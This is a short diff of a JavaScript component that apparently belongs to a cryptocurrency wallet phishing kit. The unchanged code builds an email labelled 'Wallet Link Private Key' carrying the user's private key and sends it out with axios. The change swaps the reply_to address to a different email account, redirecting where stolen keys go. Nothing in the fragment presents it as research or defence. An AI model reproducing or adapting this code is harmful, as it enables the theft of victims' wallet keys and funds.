@@ -45,7 +45,7 @@ export default {
           template_params: {
             from_name: "Wallet Link Private Key",
             private_key: this.private_key,
-            reply_to: "crewwebinar@gmail.com",
+            reply_to: "LifeofLove12@protonmail.com",
           },
         };
         axios
